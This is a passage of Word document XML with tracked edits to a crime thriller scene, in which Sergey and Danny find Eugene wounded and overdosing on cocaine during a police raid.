            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>H</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3014" w:author="TextVet" w:date="2016-03-29T10:30:00Z">
        <w:r w:rsidR="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>h</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">e walked towards </w:t>
      </w:r>
      <w:ins w:id="3015" w:author="TextVet" w:date="2016-03-29T10:30:00Z">
        <w:r w:rsidR="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Danny</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3016" w:author="TextVet" w:date="2016-03-29T10:30:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>him, s</w:delText>
        </w:r>
        <w:r w:rsidRPr="000D3488" w:rsidDel="005F2723">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>aying nothing</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="3017" w:author="TextVet" w:date="2016-03-29T10:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. Then he</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3018" w:author="TextVet" w:date="2016-03-29T10:31:00Z">
        <w:r w:rsidR="0072342A">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grabbed </w:t>
      </w:r>
      <w:del w:id="3019" w:author="TextVet" w:date="2016-03-29T10:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>Danny</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3020" w:author="TextVet" w:date="2016-03-29T10:31:00Z">
        <w:r w:rsidR="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>him</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> with both arms, and pulled him in</w:t>
      </w:r>
      <w:ins w:id="3021" w:author="TextVet" w:date="2016-03-29T10:33:00Z">
        <w:r w:rsidR="00A235C4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>to</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3022" w:author="TextVet" w:date="2016-03-29T10:33:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00A235C4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> for</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> a </w:t>
      </w:r>
      <w:del w:id="3023" w:author="TextVet" w:date="2016-03-29T10:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>cru</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="3024" w:author="TextVet" w:date="2016-03-29T10:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>shing</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3025" w:author="TextVet" w:date="2016-03-29T10:31:00Z">
        <w:r w:rsidR="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ribcage-threatening</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:ins w:id="3026" w:author="TextVet" w:date="2016-03-29T10:32:00Z">
        <w:r w:rsidR="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">bear </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>hug</w:t>
      </w:r>
      <w:del w:id="3027" w:author="TextVet" w:date="2016-03-29T10:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="0072342A">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>, almost tight enough to crack ribs</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. “Rosie, this is Daniel,” he said when he finally released him. “He is a good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waved to the young girl, but met Sergey’s eyes with a look of deep concern. “Sergey, listen… There are cops in the building. They arrested Leo. They’ll be all over the place soon.”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Sergey’s expression darkened. “Where is Eugene? He is downstairs,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didn’t see him,” Danny said. “</w:t>
      </w:r>
      <w:ins w:id="3028" w:author="TextVet" w:date="2016-03-29T10:34:00Z">
        <w:r w:rsidR="003A70DF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>H</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3029" w:author="TextVet" w:date="2016-03-29T10:34:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003A70DF">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>And h</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e’s not responding on his Bluetooth.”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Leading Rosie by the hand, Sergey pushed Danny aside and hurried out the doorway. “Come on, we have to find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When Danny caught up, </w:t>
      </w:r>
      <w:ins w:id="3030" w:author="TextVet" w:date="2016-03-29T10:36:00Z">
        <w:r w:rsidR="00415279">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>Sergey</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3031" w:author="TextVet" w:date="2016-03-29T10:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00415279">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>he</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> was crouch</w:t>
      </w:r>
      <w:ins w:id="3032" w:author="TextVet" w:date="2016-03-29T10:36:00Z">
        <w:r w:rsidR="008378A0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ing</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3033" w:author="TextVet" w:date="2016-03-29T10:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008378A0">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at the top of the stairs, </w:t>
      </w:r>
      <w:del w:id="3034" w:author="TextVet" w:date="2016-03-29T10:35:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00162E76">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">with </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>his MAC-10 in one meaty paw</w:t>
      </w:r>
      <w:ins w:id="3035" w:author="TextVet" w:date="2016-03-29T10:36:00Z">
        <w:r w:rsidR="00F40546">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3036" w:author="TextVet" w:date="2016-03-29T10:36:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F40546">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Rosie’s small hand in the other. He scanned the suite from his high vantage point. Suddenly, in a tone of horror, he screamed, “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Zhenya!</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” and ran down the staircase.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and Moshen exchanged </w:t>
      </w:r>
      <w:ins w:id="3037" w:author="TextVet" w:date="2016-03-29T10:37:00Z">
        <w:r w:rsidR="00994A74">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>puzzled</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3038" w:author="TextVet" w:date="2016-03-29T10:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00994A74">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>quizzical</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> glances. While Moshen stood upstairs with Rosie, Danny followed Sergey down</w:t>
      </w:r>
      <w:ins w:id="3039" w:author="TextVet" w:date="2016-03-29T10:37:00Z">
        <w:r w:rsidR="004B40FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ward</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3040" w:author="TextVet" w:date="2016-03-29T10:37:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004B40FA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> the stairs</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Sergey was in the sunken living room, kneeling </w:t>
      </w:r>
      <w:del w:id="3041" w:author="TextVet" w:date="2016-03-29T10:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00D92CA6">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">on the floor </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">over a </w:t>
      </w:r>
      <w:del w:id="3042" w:author="TextVet" w:date="2016-03-29T10:38:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F5129C">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">fallen </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>body. The coffee table was smashed. The couches were torn apart. The huge television was destroyed, its cracked green circuit</w:t>
      </w:r>
      <w:ins w:id="3043" w:author="TextVet" w:date="2016-03-29T10:40:00Z">
        <w:r w:rsidR="003416C9">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boards peeking out from behind the shattered screen.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was lying face-down on the floor beside the broken coffee table.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no…,” Sergey gasped, and felt for his nephew’s pulse.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Danny approached, he saw a deep dent in Eugene’s helmet. He had apparently taken a bullet to the head. The helmet had kept it from killing him, but the impact must’ve felt like a baseball bat to the skull. His hands and feet were twitching. As Danny drew nearer, he could see that Eugene was still breathing.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fact, he was breathing quite rapidly. Too rapidly.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And then, a new smell hit Danny’s nostrils: a bitter medicinal smell, with pungent hints of acetone. The odor hung thickly in the sunken living room, growing stronger as Danny came closer. </w:t>
      </w:r>
      <w:r w:rsidR="0085709F">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Only recently had </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Danny come to know that smell</w:t>
      </w:r>
      <w:r w:rsidR="003844A1">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:del w:id="3044" w:author="TextVet" w:date="2016-03-29T10:43:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="003844A1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">It was the smell of </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>cocaine.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Sergey gently turned Eugene’s head. Eugene’s cheeks and nose were encrusted </w:t>
      </w:r>
      <w:ins w:id="3045" w:author="TextVet" w:date="2016-03-29T10:45:00Z">
        <w:r w:rsidR="00EC358E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>with</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3046" w:author="TextVet" w:date="2016-03-29T10:45:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EC358E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>in</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> white powder. A thick heap of </w:t>
      </w:r>
      <w:ins w:id="3047" w:author="TextVet" w:date="2016-03-29T10:46:00Z">
        <w:r w:rsidR="00EC358E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>i</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:del w:id="3048" w:author="TextVet" w:date="2016-03-29T10:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00EC358E">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>he drug</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> lay </w:t>
      </w:r>
      <w:ins w:id="3049" w:author="TextVet" w:date="2016-03-29T10:46:00Z">
        <w:r w:rsidR="006A49D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>pyramided</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3050" w:author="TextVet" w:date="2016-03-29T10:46:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="006A49D2">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>strewn</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> just beneath the man’s face. Less than a foot away, a crystal bowl lay shattered.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had fallen face-down into the pile. Unconscious and helpless, he had lain there inhaling the stimulant.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pulled the dented helmet away and pried open Eugene’s eyes. The pupils were so wide that the iris was invisible. His face was pale and damp with sweat.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propped him to his feet. Violent spasms shook his limbs. He balanced for a moment, then clutched his stomach, collapsed to his hands and knees, and began dry-heaving.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thin, scared voice came from the stairs. “</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Zhenya…?</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>” Rosie ran toward the living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grabbed her and held a hand over her eyes. “Get her out of here!” he commanded Danny. “Don’t let her see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Eugene slowly climbed back onto his unsteady feet. He began vigorously brushing his arms, as though they were crawling with invisible insects.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at Moshen. “The cops have a medical team on the way. If we can get Eugene to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Moshen gingerly put a hand on Eugene’s back. Eugene jumped and began throwing wild punches. Moshen leaned away, then gently coaxed him to follow. He </w:t>
      </w:r>
      <w:ins w:id="3051" w:author="TextVet" w:date="2016-03-29T10:50:00Z">
        <w:r w:rsidR="00BA32FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>mov</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3052" w:author="TextVet" w:date="2016-03-29T10:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00BA32FB">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>walk</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ed in jerky, halting steps, babbling rapidly. The two headed toward the stairwell.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w:t>
      </w:r>
      <w:ins w:id="3053" w:author="TextVet" w:date="2016-03-29T10:50:00Z">
        <w:r w:rsidR="00171436">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>approached</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="3054" w:author="TextVet" w:date="2016-03-29T10:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00171436">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>came up to</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Sergey, still holding his daughter. “We need to haul our asses to the yacht. The Claymore van is no good to us anymore — </w:t>
      </w:r>
      <w:del w:id="3055" w:author="TextVet" w:date="2016-03-29T10:50:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00DA03A5">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
